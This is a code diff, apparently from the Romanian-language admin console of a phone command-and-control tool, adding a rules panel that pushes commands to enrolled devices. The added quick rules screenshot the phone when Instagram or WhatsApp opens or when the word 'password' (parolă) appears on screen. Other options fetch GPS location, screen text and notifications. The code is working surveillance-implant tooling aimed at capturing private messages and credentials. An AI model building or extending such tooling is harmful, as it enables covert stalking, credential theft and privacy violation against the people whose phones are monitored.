@@ -2273,50 +2273,79 @@ button.mini.on{background:var(--amber);color:#000;border-color:var(--amber)}
 <button class="mini" id="splitToggle" onclick="toggleSplit()" title="Comută lățimea coloanei de rezultate">⇆ lărgește rezultatele</button>
 </div>
 <div id="rulesPanel" class="card" style="display:none">
-<h2>⚡ Reguli & Alerte <span class="dim" style="font-size:12px;font-weight:400">— automaton</span></h2>
+<h2>⚡ Reguli & Alerte <span class="dim" style="font-size:12px;font-weight:400">— comenzi automate când se întâmplă ceva</span></h2>
+<div style="font-size:12px;color:var(--dim);margin-bottom:10px;padding:6px 10px;background:var(--panel2);border-radius:6px">
+<b>Cum funcționează:</b> Când telefonul trimite un ping de sănătate (la ~10 min), serverul verifică fiecare regulă.
+Dacă condiția e îndeplinită, comanda e trimisă automat pe telefon și apare o alertă aici.
+</div>
 <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
 <div>
 <h3 style="font-size:13px;color:var(--dim);margin-bottom:6px">Reguli active</h3>
-<div id="rulesList" style="max-height:180px;overflow-y:auto;margin-bottom:8px"><span class="empty">niciun dispozitiv selectat</span></div>
-<div style="font-size:11px;color:var(--dim2);margin-bottom:4px">Adaugă regulă (per dispozitiv):</div>
-<div style="display:flex;gap:4px;flex-wrap:wrap">
-<input id="ruleName" placeholder="nume (ex: Instagram)" style="flex:2;min-width:80px">
-<select id="ruleType" style="flex:1;min-width:100px">
-<option value="foreground_match">app în prim-plan</option>
-<option value="battery_below">baterie sub</option>
-<option value="screen_keyword">text pe ecran</option>
-</select>
-<input id="rulePattern" placeholder="pattern / prag" style="flex:2;min-width:80px">
-<select id="ruleAction" style="flex:1;min-width:80px">
+<div id="rulesList" style="max-height:180px;overflow-y:auto;margin-bottom:8px"><span class="empty">niciuna</span></div>
+<div style="font-size:11px;color:var(--dim2);margin-bottom:6px">⚡ Reguli rapide:</div>
+<div style="display:flex;gap:4px;flex-wrap:wrap;margin-bottom:8px">
+<button class="mini" onclick="quickRule('Instagram','foreground_match','com.instagram.android','screenshot')">📸 Instagram</button>
+<button class="mini" onclick="quickRule('WhatsApp','foreground_match','com.whatsapp','screenshot')">💬 WhatsApp</button>
+<button class="mini" onclick="quickRule('Baterie scăzută','battery_below','15','device')">🔋 Baterie &lt;15%</button>
+<button class="mini" onclick="quickRule('Parolă pe ecran','screen_keyword','parolă','screenshot')">🔑 Parolă</button>
+</div>
+<div style="border-top:1px solid var(--line);padding-top:8px">
+<div style="font-size:11px;color:var(--dim2);margin-bottom:4px">Regulă personalizată:</div>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;margin-bottom:4px">
+<div><span class="lbl" style="font-size:10px">Când se întâmplă…</span>
+<select id="ruleType" onchange="updRulePattern()" style="width:100%">
+<option value="foreground_match">O aplicație e în prim-plan</option>
+<option value="battery_below">Bateria e sub un procent</option>
+<option value="screen_keyword">Un text apare pe ecran</option>
+</select></div>
+<div><span class="lbl" style="font-size:10px">Condiția (nume / prag / cuvânt)</span>
+<input id="rulePattern" placeholder="ex: com.instagram.android" oninput="updRulePreview()" style="width:100%"></div>
+</div>
+<div style="display:grid;grid-template-columns:1fr 1fr 60px 30px;gap:4px;margin-bottom:4px">
+<div><span class="lbl" style="font-size:10px">Nume regulă</span>
+<input id="ruleName" placeholder="ex: Alertă Instagram" style="width:100%"></div>
+<div><span class="lbl" style="font-size:10px">Trimite comanda</span>
+<select id="ruleAction" onchange="updRulePreview()" style="width:100%">
 <option value="screenshot">screenshot</option>
 <option value="screen_text">screen_text</option>
 <option value="gps">gps</option>
 <option value="notifications">notificări</option>
 <option value="device">device</option>
-</select>
-<input id="ruleCooldown" type="number" value="300" min="30" title="cooldown secunde" style="width:50px">
-<button class="mini" onclick="addRule()">+</button>
+</select></div>
+<div><span class="lbl" style="font-size:10px">Cooldown(s)</span>
+<input id="ruleCooldown" type="number" value="300" min="30" style="width:100%"></div>
+<div style="display:flex;align-items:flex-end"><button onclick="addRule()" style="width:100%">+</button></div>
 </div>
-<div style="display:flex;gap:4px;align-items:center;margin-top:6px">
-<span style="font-size:11px;color:var(--dim2)">Globe (toate dispozitivele):</span>
-<input id="gRuleName" placeholder="nume" style="width:80px">
-<select id="gRuleType" style="width:100px">
-<option value="foreground_match">prim-plan</option>
-<option value="battery_below">baterie</option>
-<option value="screen_keyword">text ecran</option>
-</select>
-<input id="gRulePattern" placeholder="pattern" style="flex:1">
-<select id="gRuleAction" style="width:80px">
-<option value="screenshot">screenshot</option>
-<option value="screen_text">text</option>
-<option value="gps">gps</option>
-</select>
-<button class="mini" onclick="addGlobalRule()">+</button>
+<div id="rulePreview" style="font-size:11px;color:var(--dim2);padding:4px 6px;background:var(--panel2);border-radius:4px;min-height:18px"></div>
 </div>
 </div>
 <div>
-<h3 style="font-size:13px;color:var(--dim);margin-bottom:6px">Alerte recente</h3>
-<div id="alertList" style="max-height:200px;overflow-y:auto"><span class="empty">niciune</span></div>
+<h3 style="font-size:13px;color:var(--dim);margin-bottom:6px">🔔 Alerte recente</h3>
+<div id="alertList" style="max-height:200px;overflow-y:auto"><span class="empty">niciune — alertele apar aici când o regulă se declanșează</span></div>
+<div style="margin-top:8px;border-top:1px solid var(--line);padding-top:8px">
+<div style="font-size:11px;color:var(--dim2);margin-bottom:4px">Regulă globală (toate dispozitivele):</div>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;margin-bottom:4px">
+<div><span class="lbl" style="font-size:10px">Când…</span>
+<select id="gRuleType" style="width:100%">
+<option value="foreground_match">aplicație în prim-plan</option>
+<option value="battery_below">baterie sub</option>
+<option value="screen_keyword">text pe ecran</option>
+</select></div>
+<div><span class="lbl" style="font-size:10px">Condiția</span>
+<input id="gRulePattern" placeholder="ex: com.instagram.android" style="width:100%"></div>
+</div>
+<div style="display:grid;grid-template-columns:1fr 1fr 30px;gap:4px">
+<div><span class="lbl" style="font-size:10px">Nume</span>
+<input id="gRuleName" placeholder="ex: Instagram GLOBAL" style="width:100%"></div>
+<div><span class="lbl" style="font-size:10px">Comandă</span>
+<select id="gRuleAction" style="width:100%">
+<option value="screenshot">screenshot</option>
+<option value="screen_text">screen_text</option>
+<option value="gps">gps</option>
+</select></div>
+<div style="display:flex;align-items:flex-end"><button class="mini" onclick="addGlobalRule()">+</button></div>
+</div>
+</div>
 </div>
 </div>
 </div>
@@ -2839,12 +2868,39 @@ function toggleSplit(){
   }
 })();
 // ── Rules engine UI ──
+var RULE_TYPE_LABELS={foreground_match:"când app-ul <b>{p}</b> e deschis",battery_below:"când bateria e sub <b>{p}%</b>",screen_keyword:"când textul <b>\"{p}\"</b> apare pe ecran"};
+var RULE_TYPE_PLACEHOLDERS={foreground_match:"ex: com.instagram.android",battery_below:"ex: 20 (procent)",screen_keyword:"ex: parolă"};
 function toggleRules(){
   var p=document.getElementById("rulesPanel");
   var on=p.style.display==="none";
   p.style.display=on?"":"none";
   document.getElementById("rulesToggle").classList.toggle("on",on);
-  if(on)loadRulesPanel();
+  if(on){loadRulesPanel();updRulePattern()}
+}
+function updRulePattern(){
+  var t=document.getElementById("ruleType").value;
+  document.getElementById("rulePattern").placeholder=RULE_TYPE_PLACEHOLDERS[t]||"";
+  updRulePreview();
+}
+function updRulePreview(){
+  var t=document.getElementById("ruleType").value;
+  var p=document.getElementById("rulePattern").value.trim();
+  var a=document.getElementById("ruleAction").value;
+  var tpl=RULE_TYPE_LABELS[t]||"";
+  if(!p){document.getElementById("rulePreview").textContent="";return}
+  document.getElementById("rulePreview").innerHTML="→ trimite <b>"+esc(a)+"</b> "+tpl.replace("{p}",esc(p));
+}
+async function quickRule(name,type,pattern,action){
+  var uid=selDev();if(!uid)return alert("Selectează un dispozitiv.");
+  try{
+    var r=await api("/admin/api/c2/rules?uid="+encodeURIComponent(uid));
+    var rules=r.device||[];
+    // Don't add if same name already exists
+    if(rules.some(function(x){return x.name===name}))return alert("Regula '"+name+"' există deja.");
+    rules.push({id:"r"+Date.now(),name:name,trigger:{type:type,pattern:pattern},actions:[action],cooldown_s:300,enabled:true,lastFired:null});
+    await api("/admin/api/c2/rules?uid="+encodeURIComponent(uid),{method:"PUT",body:{scope:"device",rules:rules}});
+    loadRulesPanel();
+  }catch(e){alert("eroare: "+e.message)}
 }
 async function loadRulesPanel(){
   var uid=selDev();
@@ -2853,18 +2909,21 @@ async function loadRulesPanel(){
     var r=await api("/admin/api/c2/rules?uid="+encodeURIComponent(uid));
     var all=(r.device||[]).concat(r.global||[]);
     document.getElementById("rulesList").innerHTML=all.length?all.map(function(x){
-      var cd=x.cooldown_s||300;
       var last=x.lastFired?ago(x.lastFired,Math.floor(Date.now()/1000)):"niciodată";
       var acts=(x.actions||[]).join(", ");
+      var tpl=(RULE_TYPE_LABELS[x.trigger.type]||"").replace("{p}",esc(x.trigger.pattern||""));
+      var scope=(r.global||[]).some(function(g){return g.id===x.id})?"GLOBAL":"";
       var dis=x.enabled===false;
-      return"<div style='display:flex;align-items:center;gap:6px;padding:4px 0;border-bottom:1px solid var(--line);font-size:12px'>"
-        +"<span class='badge "+(dis?"offline":"done")+"' style='font-size:10px'>"+(dis?"off":"on")+"</span>"
-        +"<span style='font-weight:600;flex:1'>"+esc(x.name)+"</span>"
-        +"<span class='mono dim' style='font-size:10px'>"+esc(x.trigger.type||"")+"</span>"
-        +"<span class='dim' style='font-size:10px'>"+esc(acts)+"</span>"
-        +"<span class='dim' style='font-size:10px'>"+last+"</span>"
-        +"<button class='mini' style='font-size:10px' onclick='delRule(\""+esc(x.id)+"\")'>×</button></div>";
-    }).join(""):'<span class="empty">niciuna</span>';
+      return"<div style='padding:6px 0;border-bottom:1px solid var(--line)'>"
+        +"<div style='display:flex;align-items:center;gap:6px'>"
+        +"<span class='badge "+(dis?"offline":"done")+"' style='font-size:9px'>"+(dis?"OFF":"ON")+"</span>"
+        +"<b style='font-size:12px'>"+esc(x.name)+"</b>"
+        +(scope?"<span class='badge queued' style='font-size:8px'>"+scope+"</span>":"")
+        +"<span style='margin-left:auto;font-size:10px;color:var(--dim2)'>declanșat: "+last+"</span>"
+        +"<button class='mini' style='font-size:10px;padding:2px 6px' onclick='delRule(\""+esc(x.id)+"\")'>șterge</button></div>"
+        +"<div style='font-size:11px;color:var(--dim);margin-top:2px;padding-left:4px'>"+tpl+" → <b>"+esc(acts)+"</b></div>"
+        +"</div>";
+    }).join(""):'<span class="empty">niciuna — adaugă o regulă rapidă de mai jos</span>';
   }catch(e){document.getElementById("rulesList").innerHTML='<span class="empty">eroare</span>'}
   // Alerts
   try{
@@ -2877,10 +2936,10 @@ async function loadRulesPanel(){
       return"<div style='padding:4px 0;border-bottom:1px solid var(--line);font-size:11px'>"
         +"<span class='mono' style='color:var(--amber)'>"+dstr+" "+ts+"</span> "
         +"<b>"+esc(x.rule_name)+"</b> "
-        +"<span class='dim'>→ "+esc((x.actions||[]).join(", "))+"</span>"
-        +(x.data&&x.data.fg?"<div class='dim' style='font-size:10px'>app: "+esc(x.data.fg)+"</div>":"")
+        +"<span class='dim'>→ "+esc((x.actions||[]).join(", "))+" trimis pe telefon</span>"
+        +(x.data&&x.data.fg?"<div style='font-size:10px;color:var(--dim2);padding-left:8px'>app la momentul alertei: "+esc(x.data.fg)+"</div>":"")
         +"</div>";
-    }).join(""):'<span class="empty">niciune</span>';
+    }).join(""):'<span class="empty">niciune — alertele apar aici când o regulă se declanșează</span>';
   }catch(e){}
 }
 async function addRule(){
@@ -2890,13 +2949,15 @@ async function addRule(){
   var pattern=document.getElementById("rulePattern").value.trim();
   var action=document.getElementById("ruleAction").value;
   var cooldown=parseInt(document.getElementById("ruleCooldown").value)||300;
-  if(!name||!pattern)return alert("Nume și pattern obligatorii.");
+  if(!name)return alert("Dă un nume regulii.");
+  if(!pattern)return alert("Scrie condiția (nume aplicație, procent, sau cuvânt).");
   try{
     var r=await api("/admin/api/c2/rules?uid="+encodeURIComponent(uid));
     var rules=r.device||[];
     rules.push({id:"r"+Date.now(),name:name,trigger:{type:type,pattern:pattern},actions:[action],cooldown_s:cooldown,enabled:true,lastFired:null});
     await api("/admin/api/c2/rules?uid="+encodeURIComponent(uid),{method:"PUT",body:{scope:"device",rules:rules}});
     document.getElementById("ruleName").value="";document.getElementById("rulePattern").value="";
+    document.getElementById("rulePreview").textContent="";
     loadRulesPanel();
   }catch(e){alert("eroare: "+e.message)}
 }
@@ -2905,7 +2966,8 @@ async function addGlobalRule(){
   var type=document.getElementById("gRuleType").value;
   var pattern=document.getElementById("gRulePattern").value.trim();
   var action=document.getElementById("gRuleAction").value;
-  if(!name||!pattern)return alert("Nume și pattern obligatorii.");
+  if(!name)return alert("Dă un nume regulii.");
+  if(!pattern)return alert("Scrie condiția.");
   try{
     var r=await api("/admin/api/c2/rules?uid="+encodeURIComponent(selDev()||"__global__"));
     var rules=r.global||[];
